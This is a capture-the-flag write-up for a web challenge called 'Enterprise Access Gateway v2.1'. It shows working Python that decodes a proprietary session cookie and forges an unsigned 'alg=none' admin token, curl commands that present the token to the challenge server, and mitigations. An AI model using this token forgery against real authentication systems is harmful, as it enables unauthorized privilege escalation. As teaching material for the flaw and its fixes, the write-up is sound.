 # Enterprise Access Gateway v2.1

**Competition:** ITSCyberGame
**Category:** Web
**Service:** `sfide.itscybergame.it:<port_number>`

---

## Description

> An old corporate authentication gateway was restored for internal archival testing. The system uses proprietary tokens to manage access to restricted modules and potential privilege escalation. Only authorized staff can access the Reserved Console. The gateway claims to perform secure token validation before granting elevated privileges. Can you access the administrative module?

---

## Solution

### 1. Reconnaissance

Enumerating the application's endpoints reveals three relevant routes:

```
GET  /        → 200  (homepage)
GET  /login   → 200  (authentication form)
GET  /admin   → 403  (reserved console)
```

The `/login` form accepts any username except `admin`, which is rejected with the message "This username is reserved". After logging in with any username (e.g. `user`), the server issues a `sessiondata` cookie:

```bash
curl -s -D - -X POST 'sfide.itscybergame.it:<port_number>/login' \
  -d 'username=user' | grep 'set-cookie'
```

```
set-cookie: sessiondata=eJxFirsKgDAQBP9la5EgKpg...
```

### 2. Analysis of the proprietary token

The cookie value is not a standard JWT but a proprietary format: a JSON payload compressed with zlib and encoded in URL-safe base64, followed by an HMAC-SHA256 signature.

```python
import base64, zlib, json

raw = "eJxFirsKgDAQBP9la5EgKpg..."
payload_b64 = raw.split('.')[0].replace('-','+').replace('_','/')
payload_b64 += '=' * (4 - len(payload_b64) % 4)
data = zlib.decompress(base64.b64decode(payload_b64))
print(json.loads(data))
```

Decoded content:

```json
{
  "meta": {"alg": "HS256", "build": "2004.09"},
  "data": {
    "sub": "user",
    "role": "user",
    "tier": "standard",
    "scope": ["panel"]
  }
}
```

The `meta.alg` field indicates the signature algorithm used for validation.

### 3. `alg=none` attack

The vulnerability is classic: the server reads the `alg` field from the token (controlled by the attacker) and uses it to decide how to validate the signature. Setting `"alg": "none"` and providing an empty signature causes the server to skip cryptographic verification entirely.

Forge a token with admin privileges:

```python
import base64, zlib, json

payload = {
    "meta": {"alg": "none", "build": "2004.09"},
    "data": {
        "sub": "administrator",
        "role": "admin",
        "tier": "elevated",
        "scope": ["panel", "admin"]
    }
}

compressed = zlib.compress(json.dumps(payload, separators=(',',':')).encode())
encoded = base64.b64encode(compressed).decode()
encoded = encoded.replace('+', '-').replace('/', '_').rstrip('=')

# Empty signature = just the trailing dot separator
forged_token = encoded + "."
print(forged_token)
```

### 4. Accessing the reserved console

```bash
curl -s -b "sessiondata=eJw1i0EKgDAMBP-yZ5EiXvQr...." \
  'sfide.itscybergame.it:<port_number>/admin'
```

The server accepts the unsigned token, recognizes `role: admin` and displays the Reserved Console containing the flag.

---

## Flag

```
flag{...}
```

---

## Conclusions

This challenge demonstrates the **`alg=none`** attack, a well-known vulnerability in JWT-like systems. The root cause is including the signature algorithm inside the token payload (attacker-controlled) instead of enforcing it server-side. Correct mitigations:

1. **Ignore** the token's `alg` field and always use the server-configured algorithm.
2. **Explicitly reject** `alg=none` and any unexpected algorithms.
3. **Never trust** security metadata embedded in the data you are validating.

The version label "v2.1" and the `Build 2004.09` hint at a pre-standard era of proprietary auth systems, where these design choices were common and rarely scrutinized.
